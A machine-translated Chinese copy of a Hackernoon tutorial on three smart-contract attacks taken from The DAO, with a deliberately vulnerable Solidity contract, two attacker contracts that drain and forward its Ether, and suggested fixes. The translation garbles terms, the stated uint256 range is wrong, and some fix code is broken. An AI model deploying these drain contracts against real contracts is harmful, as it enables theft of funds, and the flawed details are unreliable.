<html>
<head>
<title>Smart Contract Attacks [Part 1] - 3 Attacks We Should All Learn From The DAO</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">智能契约攻击[第1部分] - 3攻击我们都应该向道学习</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/smart-contract-attacks-part-1-3-attacks-we-should-all-learn-from-the-dao-909ae4483f0a?source=collection_archive---------4-----------------------#2018-07-05">https://medium.com/hackernoon/smart-contract-attacks-part-1-3-attacks-we-should-all-learn-from-the-dao-909ae4483f0a?source=collection_archive---------4-----------------------#2018-07-05</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><figure class="ht hu fm fo hv hw fe ff paragraph-image"><div role="button" tabindex="0" class="hx hy di hz bf ia"><div class="fe ff hs"><img src="../Images/b09fee753caaf8ffb06af8ba4895fb57.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E6MzKgsodT0xPCSHF2mGWQ.jpeg"/></div></div></figure><div class=""/><p id="3c6e" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">如果你已经关注加密足够长的时间，你可能听说过一两个智能合同攻击，这些攻击导致价值数千万美元的加密资产被盗。最引人注目的攻击仍然是分散自治组织(DAO)，这是crypto有史以来最受期待的项目之一，也是智能合约革命性能力的典型代表。虽然大多数人听说过这些攻击，但很少有人真正理解哪里出了问题，是如何出问题的，以及如何避免两次犯同样的错误。</p><p id="a727" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">智能合约是动态的、复杂的，而且非常强大。虽然它们的潜力难以想象，但它们不太可能在一夜之间变得防攻击。也就是说，为了密码的未来，我们必须从以前的错误中吸取教训，共同成长。尽管DAO已经成为过去，但它仍然是易受智能契约攻击的一个很好的例子，开发人员、投资者和社区成员应该熟悉它。</p><p id="81ec" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">在我的<em class="ka">智能契约攻击</em>系列的第1部分中，我将带您详细了解(包括可靠性代码)我们可以从DAO学到的3种常见攻击。无论您是开发人员、投资者还是加密爱好者，了解这些攻击将使您对这项有前途的技术有更深的理解和欣赏。</p></div><div class="ab cl kb kc hc kd" role="separator"><span class="ke bw bk kf kg kh"/><span class="ke bw bk kf kg kh"/><span class="ke bw bk kf kg"/></div><div class="hn ho hp hq hr"><h2 id="04f5" class="ki kj if bd kk kl km kn ko kp kq kr ks jn kt ku kv jr kw kx ky jv kz la lb lc dt translated"><a class="ae ld" href="https://twitter.com/pete_humiston?lang=en" rel="noopener ugc nofollow" target="_blank"> <strong class="ak">在推特上关注我</strong> </a></h2><h2 id="2505" class="ki kj if bd kk kl km kn ko kp kq kr ks jn kt ku kv jr kw kx ky jv kz la lb lc dt translated"><a class="ae ld" href="https://codeburst.io/build-your-first-ethereum-smart-contract-with-solidity-tutorial-94171d6b1c4b" rel="noopener" target="_blank"> <strong class="ak">想写你的第一份智能合同？查看我的教程</strong> </a></h2></div><div class="ab cl kb kc hc kd" role="separator"><span class="ke bw bk kf kg kh"/><span class="ke bw bk kf kg kh"/><span class="ke bw bk kf kg"/></div><div class="hn ho hp hq hr"><h1 id="5f54" class="le kj if bd kk lf lg lh ko li lj lk ks ll lm ln kv lo lp lq ky lr ls lt lb lu dt translated">攻击1:可重入性</h1><p id="ffa0" class="pw-post-body-paragraph jc jd if je b jf lv jh ji jj lw jl jm jn lx jp jq jr ly jt ju jv lz jx jy jz hn dt translated">当攻击者通过递归调用目标的取款函数<em class="ka">、</em>从目标中提取资金时，就发生了可重入攻击，DAO就是这种情况。当合同在发送资金之前未能更新其状态(用户的余额)时，攻击者可以不断调用取款函数来耗尽合同的资金。每当攻击者收到Ether时，攻击者的契约会自动调用其回退函数<code class="eh ma mb mc md b">function ()</code>，该函数被编写为再次调用withdraw函数。此时，攻击进入了一个递归循环，合同的资金开始流向攻击者。因为目标契约在调用攻击者的回退函数时被卡住了，所以该契约永远无法更新攻击者的余额。目标合同被骗以为没有问题...需要说明的是，<em class="ka">回退功能是合同的一个功能，每当合同接收到以太和零数据时，该功能就会自动执行。</em></p><p id="9618" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><strong class="je ig">攻击</strong></p><ol class=""><li id="ea5a" class="me mf if je b jf jg jj jk jn mg jr mh jv mi jz mj mk ml mm dt translated">攻击者向目标契约捐赠乙醚</li><li id="118d" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz mj mk ml mm dt translated">目标契约更新攻击者捐赠以太的余额</li><li id="c37e" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz mj mk ml mm dt translated">攻击者要求收回资金</li><li id="6acf" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz mj mk ml mm dt translated">资金被退回</li><li id="5349" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz mj mk ml mm dt translated">攻击者的后退功能被触发，并要求随后撤退</li><li id="ab07" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz mj mk ml mm dt translated">智能合约更新攻击者余额的逻辑尚未执行，因此再次成功调用了取款</li><li id="7ce3" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz mj mk ml mm dt translated">资金被发送给攻击者</li><li id="740c" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz mj mk ml mm dt translated">重复步骤5–7</li><li id="823e" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz mj mk ml mm dt translated">一旦攻击结束，攻击者就从他们的合同中向他们的个人地址发送资金</li></ol><figure class="mt mu mv mw fq hw fe ff paragraph-image"><div class="fe ff ms"><img src="../Images/f3ec8da2543e0efb7f0cbfb220cef0b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:988/format:webp/1*UeDgMZo2n0skHzgkl352zQ.png"/></div><figcaption class="mx my fg fe ff mz na bd b be z ek">The recursive loop of a reentrancy attack</figcaption></figure><p id="4cc7" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">不幸的是，一旦攻击开始，就没有办法停止。攻击者的撤回功能会被反复调用，直到契约要么气尽，要么受害者的乙醚余额已经耗尽。</p><p id="335d" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><strong class="je ig">下面的代码<br/> </strong>是易受影响的DAO契约的简化版本，它包括一些注释，以便不熟悉编程/可靠性的人更好地理解该契约。</p><pre class="mt mu mv mw fq nb md nc nd aw ne dt"><span id="fdd6" class="ki kj if md b fv nf ng l nh ni"><strong class="md ig">contract babyDAO {</strong><br/> <br/>    /* assign key/value pair so we can look up <br/>    credit integers with an ETH address */ <br/>    <strong class="md ig">mapping (address =&gt; uint256) public credit;<br/></strong> <br/>    /* a function for funds to be added to the contract,<br/>    sender will be credited amount sent */<br/><strong class="md ig">    function donate(address to) payable {<br/>        credit[msg.sender] += msg.value;<br/>    }</strong><br/> <br/>    /*show ether credited to address*/<br/>    <strong class="md ig">function assignedCredit(address) returns (uint) {<br/>        return credit[msg.sender];<br/>    }</strong><br/> <br/>    /*withdrawal ether from contract*/<br/>    <strong class="md ig">function withdraw(uint amount) {<br/>        if (credit[msg.sender] &gt;= amount) {<br/>        msg.sender.call.value(amount)();<br/>        credit[msg.sender] -= amount;</strong><br/><strong class="md ig">    }<br/>  }<br/>}</strong></span></pre><p id="9ab1" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">如果我们看一下<code class="eh ma mb mc md b">function withdraw()</code>，我们可以看到DAO联系人使用<code class="eh ma mb mc md b">address.call.value()</code>向<code class="eh ma mb mc md b">msg.sender</code>发送资金。不仅如此，在资金已经发出后，契约还会更新<code class="eh ma mb mc md b">credit[msg.sender]</code> <em class="ka">的状态。这两者都是大忌。认识到合约代码中的这些漏洞，攻击者可以使用类似下面的<code class="eh ma mb mc md b">contract <em class="ka">ThisIsAHodlUp {}</em></code> <em class="ka"> </em>这样的合约来清算所有的<code class="eh ma mb mc md b">contract babyDAO{}</code>资金。</em></p><pre class="mt mu mv mw fq nb md nc nd aw ne dt"><span id="2bea" class="ki kj if md b fv nf ng l nh ni"><strong class="md ig">import ‘browser/babyDAO.sol’;</strong></span><span id="a099" class="ki kj if md b fv nj ng l nh ni"><strong class="md ig">contract ThisIsAHodlUp {<br/>    <br/>    </strong>/* assign babyDAO contract as "dao" */<strong class="md ig"><br/>    babyDAO public dao = babyDAO(0x2ae...);<br/>    address owner;<br/> </strong><br/>    /*assign contract creator as owner*/<br/>   <strong class="md ig"> constructor(ThisIsAHodlUp) public {<br/>        owner = msg.sender;<br/>    }</strong></span><span id="a3c7" class="ki kj if md b fv nj ng l nh ni">    /*fallback function, withdraws funds from babyDAO*/<br/>    <strong class="md ig">function() public { <br/>        dao.withdraw(dao.assignedCredit(this));<br/>    }</strong><br/>    <br/>    /*send drained funds to attacker’s address*/<br/> <strong class="md ig">   function drainFunds() payable public{<br/>        owner.transfer(address(this).balance);<br/>    }<br/>}</strong></span></pre><p id="9624" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">请注意，回退函数<code class="eh ma mb mc md b">function()</code>调用<code class="eh ma mb mc md b">dao</code>或<code class="eh ma mb mc md b">contract babyDAO{}</code>的撤销函数，从合同中窃取资金。另一方面，<code class="eh ma mb mc md b">function drainFunds()</code>将在攻击结束时被调用，此时攻击者想要将所有被盗的以太网发送到他们的地址。</p><p id="78d6" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><strong class="je ig">解决方案<br/> </strong>现在应该很清楚，可重入攻击利用了两个特定的智能合约漏洞。第一种情况是，合同的状态是在资金发送之后而不是之前更新的。由于未能在发送资金之前更新合同状态，该功能可能会在计算过程中被中断，合同将被欺骗，认为资金实际上还没有发送。第二个漏洞是当契约错误地使用<code class="eh ma mb mc md b">address.call.value()</code>而不是<code class="eh ma mb mc md b">address.transfer()</code>或<code class="eh ma mb mc md b">address.send()</code>发送资金时。两人的津贴都被限制在2300汽油，只够记录一次事件，而不是多次外部呼叫。</p><ul class=""><li id="0f58" class="me mf if je b jf jg jj jk jn mg jr mh jv mi jz nk mk ml mm dt translated">发送资金前更新合同余额</li><li id="5370" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">发送资金时使用<code class="eh ma mb mc md b"><a class="ae ld" href="http://solidity.readthedocs.io/en/develop/units-and-global-variables.html?highlight=transfer#address-related" rel="noopener ugc nofollow" target="_blank">address.transfe</a>r()</code>或<code class="eh ma mb mc md b"><a class="ae ld" href="http://solidity.readthedocs.io/en/develop/units-and-global-variables.html?highlight=transfer#address-related" rel="noopener ugc nofollow" target="_blank">address.send</a>()</code></li></ul><pre class="mt mu mv mw fq nb md nc nd aw ne dt"><span id="0d1f" class="ki kj if md b fv nf ng l nh ni"><strong class="md ig">contract babyDAO{</strong></span><span id="0682" class="ki kj if md b fv nj ng l nh ni">    ....</span><span id="bba5" class="ki kj if md b fv nj ng l nh ni"><strong class="md ig">    function withdraw(uint amount) {<br/>        if (credit[msg.sender] &gt;= amount) {<br/>        credit[msg.sender] -= amount; </strong>/* updates balance first */<strong class="md ig"><br/>        msg.sender.send(amount)(); </strong>/* send funds properly */<strong class="md ig"><br/>        }<br/>}</strong></span></pre><h1 id="2e00" class="le kj if bd kk lf nl lh ko li nm lk ks ll nn ln kv lo no lq ky lr np lt lb lu dt translated"><strong class="ak">攻击二:下溢</strong></h1><p id="aa75" class="pw-post-body-paragraph jc jd if je b jf lv jh ji jj lw jl jm jn lx jp jq jr ly jt ju jv lz jx jy jz hn dt translated">虽然DAO契约没有成为下溢攻击的受害者，但是我们可以利用现有的<code class="eh ma mb mc md b">babyDAO contract{}</code>来更好地理解这种常见的攻击是如何发生的。</p><p id="1b57" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">首先，让我们确保了解什么是<code class="eh ma mb mc md b">uint256</code>。<code class="eh ma mb mc md b">uint256</code>是一个256位的无符号整数(无符号，因为只有正整数)。以太坊虚拟机被设计为使用256位作为其字长，即计算机CPU一次处理的位数。因为EVM的大小限制为256位，所以分配的数字范围是0到4，294，967，295 (2 ⁵⁶).如果我们越过这个范围，数字被重置到范围的底部(2 ⁵⁶ + 1 = 0)。如果我们在这个范围之下，数字被重置到范围的顶端(0–1 = 2 ⁵⁶).</p><p id="4e6a" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">当我们从零中减去一个大于零的数时，就会发生下溢，产生一个新分配的2 ⁵⁶.的整数现在，如果攻击者的余额出现下溢，余额将被更新，这样所有的资金都可能被盗。</p><p id="9643" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><strong class="je ig">攻击</strong></p><ul class=""><li id="218a" class="me mf if je b jf jg jj jk jn mg jr mh jv mi jz nk mk ml mm dt translated">攻击者通过向目标契约发送1个Wei来发起攻击</li><li id="9057" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">该合同将汇款人发送的资金记入贷方</li><li id="f8d4" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">随后的撤回同样被称为1魏</li><li id="64c2" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">合同从发送者的信用中减去1魏，现在余额又是零</li><li id="267b" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">因为目标契约向攻击者发送以太，所以攻击者的回退函数也被触发，并再次调用撤销</li><li id="ea9a" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">1魏的撤军是有记载的</li><li id="3ea2" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">攻击者的合同余额已经更新了两次，第一次更新为零，第二次更新为-1</li><li id="4e02" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">攻击者的平衡被重置为2 ⁵⁶</li><li id="e3b7" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">攻击者通过提取目标合同的所有资金来完成攻击</li></ul><p id="9a9f" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><strong class="je ig">代码</strong></p><pre class="mt mu mv mw fq nb md nc nd aw ne dt"><span id="3aeb" class="ki kj if md b fv nf ng l nh ni"><strong class="md ig">import ‘browser/babyDAO’;</strong></span><span id="2a04" class="ki kj if md b fv nj ng l nh ni"><strong class="md ig">contract UnderflowAttack {<br/> <br/>    babyDAO public dao = babyDAO(0x2ae…);<br/>    address owner;<br/>    bool performAttack = true;<br/> </strong><br/>    /*set contract creator as owner*/ <br/>    <strong class="md ig">constructor{ owner = msg.sender;}</strong><br/> <br/>    /*donate 1 wei, withdraw 1 wei*/<br/>  <strong class="md ig">  function attack() {<br/>        dao.donate.value(1)(this);<br/>        dao.withdraw(1);<br/>    }</strong><br/> <br/>    /*fallback function, results in 0–1 = 2**256 */<br/>   <strong class="md ig"> function() {<br/>       if (performAttack) {<br/>       performAttack = false;<br/>       dao.withdraw(1);<br/>       }<br/>     }</strong><br/> <br/>     /*extract balance from smart contract*/<br/>    <strong class="md ig">function getJackpot() {<br/>        dao.withdraw(dao.balance);<br/>        owner.send(this.balance);<br/>    }</strong><br/><strong class="md ig">}</strong></span></pre><p id="a706" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><strong class="je ig">解决方案<br/> </strong>为了避免成为下溢攻击的受害者，最佳实践是检查更新的整数是否在其字节范围内。我们可以在代码中添加一个参数检查，作为最后一道防线。<code class="eh ma mb mc md b"> function withdraw() </code>的第一行检查资金是否充足，第二行检查溢出，第三行检查下溢。</p><pre class="mt mu mv mw fq nb md nc nd aw ne dt"><span id="f3a1" class="ki kj if md b fv nf ng l nh ni"><strong class="md ig">contract babysDAO{</strong><br/> <br/>....<br/> <br/>    /*withdrawal ether from contract*/<br/>    <strong class="md ig">function withdraw(uint amount) {<br/>        if (credit[msg.sender] &gt;= amount <br/>        &amp;&amp; credit[msg.sender] + amount &gt;= credit[msg.sender] <br/>        &amp;&amp; credit[msg.sender] - amount &lt;= credit[msg.sender]) {<br/>        credit[msg.sender] -= amount;<br/>        msg.sender.send(amount)();<br/>    }<br/>}</strong></span></pre><p id="895d" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">注意，我们上面的代码还会在发送资金之前更新用户的余额，如前所述。</p><h1 id="e1f6" class="le kj if bd kk lf nl lh ko li nm lk ks ll nn ln kv lo no lq ky lr np lt lb lu dt translated"><strong class="ak">攻击#3:跨功能竞赛条件</strong></h1><p id="b16f" class="pw-post-body-paragraph jc jd if je b jf lv jh ji jj lw jl jm jn lx jp jq jr ly jt ju jv lz jx jy jz hn dt translated">最后但同样重要的是，跨函数竞争条件攻击。正如在我们的可重入攻击中所讨论的，DAO契约未能正确更新契约状态，从而导致资金被盗。一般来说，DAO和外部调用的部分问题是跨函数竞争条件发生的可能性。</p><p id="c4fc" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">虽然以太坊中的所有事务都是串行运行的(一个接一个)，但如果管理不当，外部调用(调用另一个合同或地址)可能会导致灾难。在一个完美的世界里，它们是完全避免的。当两个函数被调用并且共享相同的状态时，就会发生跨函数竞争情况。契约被欺骗以为存在两个契约状态，而实际上只存在一个<em class="ka">真的</em>契约状态。我们不能同时拥有X = 3和X = 4…</p><p id="e4da" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">让我们用一个例子来阐明这个概念。</p><p id="6c56" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><strong class="je ig">攻击&amp;代码</strong></p><pre class="mt mu mv mw fq nb md nc nd aw ne dt"><span id="7cd1" class="ki kj if md b fv nf ng l nh ni"><strong class="md ig">contract crossFunctionRace{<br/> <br/>    mapping (address =&gt; uint) private userBalances;</strong></span><span id="e0dd" class="ki kj if md b fv nj ng l nh ni"><strong class="md ig">    </strong>/* uses userBalances to transfer funds */<strong class="md ig"><br/>    function transfer(address to, uint amount) {<br/>        if (userBalances[msg.sender] &gt;= amount) {<br/>            userBalances[to] += amount;<br/>            userBalances[msg.sender] -= amount;<br/>        }<br/>    }</strong></span><span id="2caa" class="ki kj if md b fv nj ng l nh ni"><strong class="md ig">   </strong> /* uses userBalances to withdraw funds */<strong class="md ig"><br/>    function withdrawalBalance() public {<br/>        uint amountToWithdraw = userBalances[msg.sender];<br/>        require(msg.sender.send(amountToWithdraw)());<br/>        userBalances[msg.sender] = 0;<br/>    }<br/>}</strong></span></pre><p id="776b" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">上面的合同有两个功能—一个用于转移资金，另一个用于提取资金。让我们假设攻击者呼叫<code class="eh ma mb mc md b">function transfer()</code>的同时进行外部呼叫<code class="eh ma mb mc md b">function withdrawalBalance()</code>。<code class="eh ma mb mc md b">userBalance[msg.sender]</code>州正被拉向两个不同的方向。用户的余额尚未设置为0，但攻击者也可以转移资金，尽管他们已经被提取。在这种情况下，合同已经允许攻击者<em class="ka">双重花费，</em>区块链<a class="ae ld" href="https://hackernoon.com/tagged/blockchain" rel="noopener ugc nofollow" target="_blank">技术</a>技术设计解决的问题之一。</p><p id="d167" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><em class="ka">注意:</em>如果多个合同共享状态，则这些合同可能会出现跨功能竞争条件。</p><ul class=""><li id="c54c" class="me mf if je b jf jg jj jk jn mg jr mh jv mi jz nk mk ml mm dt translated">在调用外部函数之前，先完成所有内部工作</li><li id="cadf" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">避免拨打外部电话</li><li id="6c49" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">在不可避免的情况下，将外部调用函数标记为“不可信”</li><li id="93ef" class="me mf if je b jf mn jj mo jn mp jr mq jv mr jz nk mk ml mm dt translated">当外部调用不可避免时使用互斥体</li></ul><p id="ddda" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">根据下面的合同，我们可以看到一个1)的合同示例。在打外部电话之前进行内部工作；2)。将所有外部调用函数标记为“不可信”。我们的合同允许将资金发送到一个地址，并允许用户为最初将资金存入合同而获得一次性奖励。</p><pre class="mt mu mv mw fq nb md nc nd aw ne dt"><span id="fcbb" class="ki kj if md b fv nf ng l nh ni"><strong class="md ig">contract crossFunctionRace{<br/> <br/>    mapping (address =&gt; uint) private userBalances;<br/>    mapping (address =&gt; uint) private reward;<br/>    mapping (address =&gt; bool) private claimedReward;</strong></span><span id="229f" class="ki kj if md b fv nj ng l nh ni"><strong class="md ig">    </strong>//makes external call, need to mark as untrusted<strong class="md ig"><br/>    function untrustedWithdraw(address recipient) public {<br/>        uint amountWithdraw = userBalances[recipient];<br/>        reward[recipient] = 0;<br/>        require(recipient.call.value(amountWithdraw)());<br/>    }<br/> <br/>   </strong> //untrusted because withdraw is called, an external call<strong class="md ig"><br/>    function untrustedGetReward(address recipient) public {</strong></span><span id="8fee" class="ki kj if md b fv nj ng l nh ni"><strong class="md ig">        </strong>//check that reward hasn’t already been claimed<strong class="md ig"><br/>        require(!claimedReward[recipient]); <br/> <br/>        </strong>//internal work first (claimedReward and assigning reward)<strong class="md ig"><br/>        claimedReward = true;<br/>        reward[recipient] += 100;<br/>        untrustedWithdraw(recipient);<br/>    }<br/> }</strong></span></pre><p id="58ed" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">可以看到，当向用户的合同/地址发送资金时，合同的第一个函数进行外部调用。同样，奖励函数也使用取款函数来发送一次性奖励，因此也是不可信的。同样重要的是，契约首先执行所有内部工作。就像我们的重入攻击示例一样，<code class="eh ma mb mc md b">function untrustedGetReward() </code>在允许撤销之前授予用户一次性奖励的信用，以防止跨功能竞争情况的发生。</p><p id="802f" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">在一个完美的世界里，智能合约不需要依赖外部调用。现实是，在许多情况下，外部电话几乎是不可能解决的。因此，使用互斥锁来“锁定”某些状态，并且只授予所有者更改状态的能力，可以帮助避免代价高昂的灾难。尽管互斥体非常有效，但是当用于多个契约时，它们会变得很棘手。如果您使用互斥来防止竞争情况，您将需要小心地确保没有其他方法来声明一个锁并且永远不释放它。如果采用互斥的方式，确保你已经完全理解了与它们写合同时的潜在危险(死锁、活锁等)。).</p><pre class="mt mu mv mw fq nb md nc nd aw ne dt"><span id="ac11" class="ki kj if md b fv nf ng l nh ni"><strong class="md ig">contract mutexExample{<br/> <br/>    mapping (address =&gt; uint) private balances;<br/>    bool private lockBalances;<br/> <br/>    function deposit() payable public returns (bool) {<br/>        <br/>        </strong>/*check if lockBalances is unlocked before proceeding*/<strong class="md ig"><br/>        require(!lockBalances);</strong></span><span id="4d05" class="ki kj if md b fv nj ng l nh ni"><strong class="md ig">        </strong>/*lock, execute, unlock */<strong class="md ig"><br/>        lockBalances = true;<br/>        balances[msg.sender] += msg.value;<br/>        lockBalances = false;<br/>        return true;<br/>    }<br/> <br/>    function withdraw(uint amount) payable public returns (bool) {</strong></span><span id="0674" class="ki kj if md b fv nj ng l nh ni">        /*check if lockBalances is unlocked before proceeding*/<strong class="md ig"><br/>        require(!lockBalances &amp;&amp; amount &gt; 0 &amp;&amp; balances[msg.sender]<br/>        &gt;= amount);</strong></span><span id="5b64" class="ki kj if md b fv nj ng l nh ni"><strong class="md ig">     </strong>   /*lock, execute, unlock*/<strong class="md ig"><br/>        lockBalances = true;<br/> <br/>        if (msg.sender.call(amount)()) {<br/>            balances[msg.sender] -= amount;<br/>        }<br/> <br/>        lockBalances = false;<br/>        return true;<br/>    }<br/> }</strong></span></pre><p id="bce0" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">上面我们可以看到<code class="eh ma mb mc md b">contract mutexExample()</code>有私有锁状态，用于执行<code class="eh ma mb mc md b">function deposit()</code>和<code class="eh ma mb mc md b">function withdraw()</code>。这个锁将阻止用户在第一次调用结束前成功调用<code class="eh ma mb mc md b">withdraw()</code>，防止任何跨功能竞争情况的发生。</p><h1 id="8b37" class="le kj if bd kk lf nl lh ko li nm lk ks ll nn ln kv lo no lq ky lr np lt lb lu dt translated">在一天结束的时候…</h1><p id="df88" class="pw-post-body-paragraph jc jd if je b jf lv jh ji jj lw jl jm jn lx jp jq jr ly jt ju jv lz jx jy jz hn dt translated">权力越大，责任越大。尽管区块链和智能合同技术每天都在不断发展，但风险仍然很高。攻击者一直在寻找合适的机会，抓住设计不良的合同并带着货物逃跑。如果我们如此渴望成长和突破极限，我们所有人都有责任确保从我们的同龄人以及我们自己的失败中吸取教训。希望通过这篇文章和我的系列文章的其余部分，您将对智能合约攻击和智能合约的理解更加自信。欢迎在Medium &amp; Twitter (@Pete_Humiston)上关注我，了解更多关于加密、区块链和可靠性的内容。</p><p id="fe12" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">-皮特·胡密斯顿</p><p id="4baa" class="pw-post-body-paragraph jc jd if je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">如果你喜欢这篇文章，请随意鼓掌或者在下面留言！</p><figure class="mt mu mv mw fq hw"><div class="bz el l di"><div class="nq nr l"/></div></figure></div></div>    
</body>
</html>